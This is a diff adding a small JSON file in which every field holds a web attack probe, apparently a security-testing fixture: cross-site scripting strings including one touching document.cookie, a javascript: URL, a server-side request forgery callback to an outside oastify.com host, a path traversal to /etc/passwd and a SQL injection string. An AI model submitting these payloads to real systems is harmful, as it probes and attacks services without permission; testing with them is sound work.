@@ -1,0 +1,8 @@
+{
+  "name": "<script>alert(document.cookie)</script>",
+  "description": "'\"><img src=x onerror=alert(1)>",
+  "url": "javascript:alert(1)",
+  "callback": "http://m6to7gzc12tsu2517zyj234gh7nybxzm.oastify.com/json-ssrf",
+  "file": "../../etc/passwd",
+  "query": "' OR '1'='1"
+}
